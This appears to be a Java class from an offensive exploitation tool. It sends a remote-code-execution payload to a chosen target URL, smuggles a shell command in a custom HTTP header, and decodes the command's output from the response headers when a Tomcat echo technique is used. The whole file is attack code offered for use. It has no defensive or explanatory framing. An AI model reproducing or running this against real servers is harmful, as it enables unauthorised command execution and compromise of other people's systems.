package com.droplab.Controller.elShell.Service;

import com.droplab.Controller.elShell.Common.PayloadFactory;
import com.droplab.Utils.CommonUtils;
import com.droplab.Utils.Echo.TomcatEcho;
import com.droplab.Utils.HttpUtils;
import com.droplab.Utils.InfoUtils;
import com.droplab.Utils.ResponseUtils;
import com.droplab.service.BugService;
import org.jsoup.Connection;

import java.util.Base64;
import java.util.HashMap;
import java.util.Iterator;

/**
 * 有回显的命令执行
 */
public class ResponseExec extends BugService {
    @Override
    public Object run(String type) {
        try {
            if (params.size() > 0) {
                String url = "";
                String cmd =null;
                String middle =null;
                Iterator<String> iterator = params.keySet().iterator();
                while (iterator.hasNext()) {
                    String key = iterator.next();
                    if (key.equals("url")) {
                        url = params.get(key);
                    } else if (key.equals("cmd")) {
                        cmd = params.get(key);
                    } else if (key.equals("middle")) {
                        middle = params.get(key);
                    }
                }
                if(!url.equals("") && !url.isEmpty()){
                    String code=null;
                    String EchoExecString=null;
                    if(middle.equals("Tomcat")){
                        EchoExecString = TomcatEcho.instance().getTomcatEchoExecString("");
                    }else {

                    }
                    String anyCodeExecute = PayloadFactory.instance().getAnyCodeExecute();
                    code=String.format(anyCodeExecute,EchoExecString);
                    cmd=cmd.trim();
                    HashMap<String, String> headers = new HashMap<>();
                    CommonUtils.hashMapClone(InfoUtils.headers, headers);
                    headers.put("Referer", url);
                    headers.put("Testdmc",cmd);
                    headers.put("Testecho","Testecho");
                    HashMap paramMap = new HashMap();
                    paramMap.put("Code", code);
                    Connection.Response post = HttpUtils.post(headers,url,paramMap );
                    ResponseUtils responseUtils = new ResponseUtils();
                    if(post.hasHeader("Testdmc") && post.hasHeader("Testecho")){
                        responseUtils.setMessage(new String(Base64.getDecoder().decode(post.header("Testdmc"))));
                    }else {
                        responseUtils.setMessage("命令执行未获取到回显，可能执行失败！");
                    }
                    return responseUtils;
                }
            }
        }catch (Exception e){
            e.printStackTrace();
        }
        return null;
    }
}
